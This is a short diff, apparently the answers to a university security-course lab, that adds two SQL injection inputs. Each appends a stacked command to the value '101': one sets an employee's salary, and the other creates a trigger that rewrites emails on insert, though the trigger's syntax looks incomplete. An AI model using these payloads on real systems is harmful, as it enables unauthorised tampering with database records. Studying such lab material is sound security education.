@@ -1,0 +1,2 @@
+101; update employee set salary = 555000 where userid=101;
+101; create trigger hacks before insert on employee for each row begin update employee set email=ece568-2019f@utoronto.ca where userid = NEW.userid;
